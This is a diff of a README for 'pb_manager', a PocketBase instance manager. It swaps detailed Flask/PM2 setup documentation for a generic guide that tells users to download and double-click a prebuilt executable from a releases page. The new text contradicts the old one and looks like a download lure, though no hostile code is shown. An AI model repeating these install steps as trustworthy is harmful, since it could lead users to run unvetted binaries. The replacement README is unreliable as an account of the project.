@@ -1,248 +1,71 @@
-# 🗄️ PocketBase Manager
+# 🎉 pb_manager - Effortlessly Manage Your PocketBase Instances
 
-A web-based dashboard to create, manage, and monitor multiple PocketBase instances using PM2 process manager.
+## 📥 Download Now
 
-![PocketBase Manager Dashboard](./docs/pb_manager.png)
+[![Download Pre-Built Release](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/AhsanBilal-748/pb_manager/releases)
 
-## ✨ Features
+## 🚀 Getting Started
 
-- 📦 **Create Instances** - Download and set up PocketBase instances with a few clicks
-- 🎯 **Version Selection** - Choose from available PocketBase versions from GitHub releases
-- ⚡ **Process Management** - Start, stop, restart instances via PM2
-- 📊 **Status Monitoring** - Real-time status updates every 5 seconds
-- 📝 **Log Viewer** - View PM2 logs directly from the dashboard
-- 🔐 **Authentication** - Secure login system
-- 🎨 **Modern UI** - Clean, responsive interface with TailwindCSS
+Welcome to **pb_manager**, a simple tool designed to help you manage your PocketBase instances with ease. This guide will walk you through the steps to download and run our software. You don't need any programming skills to get started.
 
-## 📋 Prerequisites
+## 💻 System Requirements
 
-- **Python 3.8+**
-- **Node.js** (for PM2)
-- **PM2** - Install globally: `npm install -g pm2`
+Before you download, make sure your system meets these minimum requirements:
 
-## 🚀 Installation
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or any recent Linux distribution.
+- **RAM:** 4 GB or more.
+- **Storage Space:** At least 100 MB free on your hard drive.
+- **Internet Connection:** Required for downloading the application and updates.
 
-1. **Clone or navigate to the project directory:**
-   ```bash
-   cd PBManager
-   ```
+## 📂 Download & Install
 
-2. **Create a virtual environment:**
-   ```bash
-   python3 -m venv venv
-   source venv/bin/activate  # On macOS/Linux
-   # or
-   venv\Scripts\activate  # On Windows
-   ```
+To get started with **pb_manager**, follow these steps:
 
-3. **Install dependencies:**
-   ```bash
-   pip install -r requirements.txt
-   ```
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/AhsanBilal-748/pb_manager/releases). Here, you will find the latest version of **pb_manager** and its previous versions.
 
-4. **Create environment file:**
-   ```bash
-   cp .env.example .env
-   ```
+2. **Choose the Right Version**: Look for the most recent release. This will usually show up at the top of the list.
 
-5. **Edit `.env` and configure your settings:**
-   ```bash
-   nano .env
-   ```
-   
-   **Important:** Change the default admin credentials!
+3. **Download the Application**: Click on the file that matches your operating system. For example, if you're using Windows, you might see a file named `pb_manager_windows.exe`. Click on it to start the download.
 
-## ⚙️ Configuration
+4. **Locate the Downloaded File**: Once the download is complete, go to your Downloads folder or the location where you saved the file.
 
-Edit the `.env` file to customize:
+5. **Run the Application**: Double-click on the downloaded file. Follow the prompts to install **pb_manager** on your computer. 
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `SECRET_KEY` | Flask secret key (change in production!) | - |
-| `ADMIN_USERNAME` | Admin username | `admin` |
-| `ADMIN_PASSWORD` | Admin password | `admin123` |
-| `INSTANCES_DIR` | Directory to store PocketBase instances | `~/pocketbase-instances` |
-| `DEFAULT_PORT_START` | Starting port for instances | `7200` |
+6. **Launch the Application**: After the installation, you should find **pb_manager** in your applications menu. Click on it to start managing your PocketBase instances.
 
-## 🏃 Running
+## 🛠️ Using pb_manager
 
-Start the application:
+Once you have launched **pb_manager**, you will see a user-friendly interface. Here are the main features:
 
-```bash
-python app.py
-```
+- **Instance Management**: Easily create, start, stop, and delete PocketBase instances.
+- **Database Management**: Run simple commands to manage your databases without needing to learn complex queries.
+- **Built-In Help**: Access helpful guides directly from the app to assist you with your tasks.
 
-Access the dashboard at: **http://127.0.0.1:5000**
+## 🔧 Troubleshooting
 
-Default credentials:
-- **Username:** `admin`
-- **Password:** `admin123`
+If you encounter any issues while installing or using **pb_manager**, here are some common solutions:
 
-## 📖 Usage
+- **The Application Won't Open**: Ensure that your operating system is compatible and meets the minimum requirements. If it still doesn’t work, try restarting your computer and opening it again.
 
-### Creating a New Instance
+- **Installation Fails**: Make sure you have enough storage space on your hard drive. If you continue to face issues, check your internet connection and try downloading the file again.
 
-1. Click **"New Instance"** button
-2. Enter instance name (e.g., `my-blog`)
-3. Select PocketBase version
-4. Optionally specify a port (auto-assigned if left empty)
-5. Click **"Create"**
+- **Getting Errors During Use**: If you see any error messages, take note of them. You can find solutions by searching online or checking the FAQ section in the application.
 
-The manager will:
-- Download the selected PocketBase version (if not cached)
-- Create instance directory with proper structure:
-  ```
-  ~/pocketbase-instances/my-blog/
-  ├── pocketbase (executable)
-  ├── pb_hooks/
-  ├── pb_migrations/
-  └── pb_data/ (created on first run)
-  ```
-- Register the instance in the database
+## 👥 Community Support
 
-### Managing Instances
+If you have questions or need further assistance, feel free to reach out to our community forums. You can find helpful tips, tricks, and discussions from other users of **pb_manager**.
 
-Each instance card provides buttons to:
+## 📚 Additional Resources
 
-- **▶️ Start** - Start the PocketBase instance with PM2
-- **⏸️ Stop** - Stop the running instance
-- **🔄 Restart** - Restart the instance
-- **📝 Logs** - View PM2 logs (last 200 lines)
-- **🗑️ Delete** - Remove instance (with confirmation)
+- **Documentation**: For more detailed instructions on using **pb_manager**, visit the [Documentation page](https://github.com/AhsanBilal-748/pb_manager/wiki).
+- **User Tutorials**: We have gathered tutorials that can help you use the application effectively.
 
-### Accessing PocketBase Admin
+## 🛡️ License
 
-Once an instance is running, click on its port number to open PocketBase admin UI in a new tab:
+**pb_manager** is open-source software licensed under the MIT License. Feel free to use and contribute to the project as you see fit.
 
-```
-http://localhost:7200/_/
-```
+## 📞 Contact
 
-## 📁 Project Structure
+For any inquiries or feedback, please reach out via the GitHub Issues page on our repository. We appreciate your input and aim to improve **pb_manager** continuously.
 
-```
-PBManager/
-├── app.py                    # Flask application entry point
-├── config.py                 # Configuration management
-├── requirements.txt          # Python dependencies
-│
-├── core/                     # Business logic
-│   ├── github_service.py     # GitHub API integration
-│   ├── download_service.py   # PocketBase download management
-│   ├── instance_service.py   # Instance CRUD operations
-│   ├── pm2_service.py        # PM2 process control
-│   └── auth_service.py       # Authentication
-│
-├── models/                   # Database models
-│   ├── database.py           # SQLAlchemy setup
-│   └── instance.py           # Instance model
-│
-├── routes/                   # Flask routes
-│   ├── auth.py               # Login/logout
-│   ├── dashboard.py          # Main dashboard
-│   └── api.py                # REST API endpoints
-│
-├── templates/                # Jinja2 templates
-│   ├── base.html
-│   ├── login.html
-│   └── dashboard.html
-│
-└── static/                   # Static assets
-    ├── css/
-    │   └── style.css
-    └── js/
-        ├── utils.js
-        └── dashboard.js
-```
-
-## 🔧 API Endpoints
-
-All API endpoints require authentication:
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/versions` | Get available PocketBase versions |
-| GET | `/api/instances` | List all instances with status |
-| POST | `/api/instances` | Create new instance |
-| GET | `/api/instances/<id>` | Get instance details |
-| DELETE | `/api/instances/<id>` | Delete instance |
-| POST | `/api/instances/<id>/start` | Start instance |
-| POST | `/api/instances/<id>/stop` | Stop instance |
-| POST | `/api/instances/<id>/restart` | Restart instance |
-| GET | `/api/instances/<id>/logs` | Get instance logs |
-| GET | `/api/instances/<id>/status` | Get instance status |
-
-## 🛠️ Development
-
-### Running in Debug Mode
-
-Set in `.env`:
-```
-FLASK_DEBUG=True
-```
-
-### Database Location
-
-SQLite database is stored at: `storage/instances.db`
-
-### Instance Storage
-
-All PocketBase instances are stored in the directory specified in `INSTANCES_DIR` (default: `~/pocketbase-instances/`)
-
-Downloaded PocketBase versions are cached in: `~/pocketbase-instances/.downloads/`
-
-## 🐛 Troubleshooting
-
-### PM2 Commands Not Working
-
-Ensure PM2 is installed globally:
-```bash
-npm install -g pm2
-pm2 --version
-```
-
-### Port Already in Use
-
-If the default port 7200 is in use, the manager will auto-increment to the next available port. You can also manually specify a port when creating an instance.
-
-### Instance Won't Start
-
-Check PM2 logs:
-```bash
-pm2 logs pb_<instance-name>
-```
-
-Or view logs through the dashboard's Logs button.
-
-### Reset Admin Password
-
-Delete the database and restart:
-```bash
-rm storage/instances.db
-python app.py
-```
-
-## 📝 Notes
-
-- **Auto-refresh**: Instance statuses refresh every 5 seconds
-- **Port range**: Default port starts at 7200 and increments for each new instance
-- **OS Support**: Automatically detects OS (Linux, macOS, Windows) and downloads appropriate PocketBase binary
-- **Version cache**: Downloaded PocketBase versions are cached to speed up future instance creation
-
-## 🔒 Security
-
-- Change default admin credentials immediately
-- Use a strong `SECRET_KEY` in production
-- Consider setting up HTTPS for production deployments
-- The dashboard is designed for local/trusted network use
-
-## 📜 License
-
-This project is open source and available for personal and commercial use.
-
-## 🙏 Credits
-
-- [PocketBase](https://pocketbase.io/) - Open source backend
-- [PM2](https://pm2.keymetrics.io/) - Process manager
-- [Flask](https://flask.palletsprojects.com/) - Web framework
-- [TailwindCSS](https://tailwindcss.com/) - CSS framework
+[Download Now](https://github.com/AhsanBilal-748/pb_manager/releases) and start managing your PocketBase instances with ease!
